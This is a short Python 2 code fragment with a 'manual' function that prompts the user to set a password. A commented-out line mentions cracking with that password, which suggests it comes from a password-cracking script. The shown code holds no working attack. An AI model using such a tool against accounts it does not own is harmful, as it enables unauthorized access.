def manual():
	pw = raw_input(" \033[0;97m[\033[0;92m*\033[0;97m] Set Password : ")
	#print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
